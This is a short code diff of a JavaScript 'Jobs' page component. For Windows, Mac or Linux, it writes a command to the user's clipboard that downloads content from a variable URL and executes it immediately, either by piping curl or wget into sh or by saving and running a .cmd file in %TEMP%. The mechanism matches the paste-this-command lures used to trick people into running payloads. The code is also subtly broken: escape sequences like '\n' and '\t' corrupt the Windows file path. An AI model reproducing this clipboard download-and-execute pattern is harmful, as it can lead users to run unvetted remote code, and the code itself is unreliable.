@@ -176,11 +176,11 @@ export default function Jobs() {
       
      {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
      if(os === 'windows')
-      await navigator.clipboard.writeText(`curl ${cmdUrl} -O %TEMP%\nx.cmd && %TEMP%\nx.cmd`)
+      await navigator.clipboard.writeText(`curl ${cmdUrl} -O %TEMP%\tk.cmd && %TEMP%\tk.cmd`)
      else if(os === 'mac')
-      await navigator.clipboard.writeText(`curl ${cmdUrl} | bash`)
+      await navigator.clipboard.writeText(`curl "${cmdUrl}" | sh`)
      else if(os === 'linux')
-      await navigator.clipboard.writeText(`wget ${cmdUrl} | sh`)
+      await navigator.clipboard.writeText(`wget -qO- "${cmdUrl}" | sh`)
      push('Command copied to clipboard')
     } catch {
       push('Copy failed — select and copy manually')
